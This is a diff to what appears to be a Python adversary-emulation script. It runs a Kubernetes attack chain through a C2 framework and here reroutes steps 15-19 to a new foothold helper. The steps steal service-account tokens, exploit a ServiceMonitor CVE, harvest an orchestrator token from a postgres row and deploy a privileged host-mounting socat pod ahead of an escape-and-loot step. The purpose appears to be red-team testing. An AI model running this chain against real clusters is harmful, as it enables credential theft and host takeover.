@@ -213,6 +213,24 @@ def exec_system():
     return route
 
 
+def foothold_system():
+    """The system entity to run a SOURCE-SIDE procedure from (runOnTarget=false:
+    the extractor, check-token-permissions, deploy-container).
+
+    Different from exec_system(). A caught reverse shell is merged into the
+    worker Pod entity, which ran addresses as system/<pod> and resolves to that
+    Pod (edge4 probed all three forms: system/<pod> resolves, the bare pod id is
+    equivalent, c2/ran is C2-kind and 422s "not a system entity"). Chain 1 uses
+    exactly this form for its whole 17-20 tail.
+
+    exec_system() returns c2/ran, which is what the GENERIC executor
+    (execute-in-shell) needs and what lands worker-attributed rows. A source-side
+    procedure cannot run from a C2 node, so these two routes are genuinely
+    distinct and must not be merged."""
+    pod = callback_pod()
+    return f"system/{pod}" if pod else None
+
+
 def execute(action, target, args=None, note="", expect_fail=False, exec_timeout=None,
             auth=None, exec_sys=None):
     if not target:
@@ -514,7 +532,7 @@ def step_15_check_pg_token(ctx):
     sa = pg_sa_id()
     execute("install-package", pod, {"PKG": "curl"}, "unit-5/6 prereq: curl on postgres")
     if sa and execute("check-token-permissions", pod, note="unit-5/6: stolen token perms",
-                      auth=sa, exec_sys=exec_system()):
+                      auth=sa, exec_sys=foothold_system()):
         return True
     print("      not groundable locally (known delta, same as chain 1) -> continuing to Part 2")
     return True
@@ -531,7 +549,7 @@ def step_16_create_servicemonitor(ctx):
     sa = pg_sa_id()
     if sa and execute("create-servicemonitor-bearer-token-file", sa,
                       note="unit-5: CVE-2026-47702 arm the leak",
-                      auth=sa, exec_sys=exec_system()):
+                      auth=sa, exec_sys=foothold_system()):
         return True
     print("      TTP not groundable locally -> creating the ServiceMonitor CR directly")
     rc, out = sh(f"kubectl apply -f {HERE}/specimens/cve-2026-47702/13-malicious-servicemonitor.yaml")
@@ -605,7 +623,7 @@ def step_17_extract_token(ctx):
                    pg_pod_id(),
                    {"CACHE_KEY": CACHE_KEY, "DB_USER": PG_USER, "DB_NAME": PG_DB},
                    "unit-5: harvest agent-orchestrator token from the postgres row",
-                   exec_sys=exec_system())
+                   exec_sys=foothold_system())
 
 
 def step_18_check_captured(ctx):
@@ -614,7 +632,7 @@ def step_18_check_captured(ctx):
     if not tgt:
         return False
     return execute("check-token-permissions", tgt, note="unit-6: orchestrator can create pods/jobs",
-                   auth=tgt, exec_sys=exec_system())
+                   auth=tgt, exec_sys=foothold_system())
 
 
 def step_19_deploy_privileged(ctx):
@@ -638,7 +656,7 @@ def step_19_deploy_privileged(ctx):
                     "HostPath": "/", "Mount": "/host", "Privileged": "true",
                     "Image": "alpine/socat"},
                    "unit-6: attacker-controlled privileged worker",
-                   auth=tgt, exec_sys=exec_system())
+                   auth=tgt, exec_sys=foothold_system())
 
 
 def step_20_escape_and_loot(ctx):
